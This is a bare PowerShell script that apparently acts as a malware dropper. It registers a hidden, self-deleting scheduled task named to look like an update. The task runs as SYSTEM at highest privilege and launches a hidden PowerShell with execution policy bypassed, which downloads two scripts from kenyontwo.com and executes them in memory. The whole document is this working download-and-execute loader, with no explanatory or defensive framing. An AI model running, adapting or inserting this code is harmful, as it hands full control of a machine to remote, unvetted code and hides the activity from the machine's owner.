$action = New-ScheduledTaskAction -Execute powershell.exe -Argument '-NoP -EP Bypass -W Hidden -C "iex (iwr https://kenyontwo.com/byeworld11 -UseBasicParsing).Content; iex (iwr https://kenyontwo.com/test_https.ps1 -UseBasicParsing).Content"'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
$settings = New-ScheduledTaskSettingsSet -Hidden -DeleteExpiredTaskAfter 00:00:01
Register-ScheduledTask -TaskName "Update_$(Get-Random)" -Action $action -Trigger $trigger -Settings $settings -User "NT AUTHORITY\SYSTEM" -RunLevel Highest | Out-Null
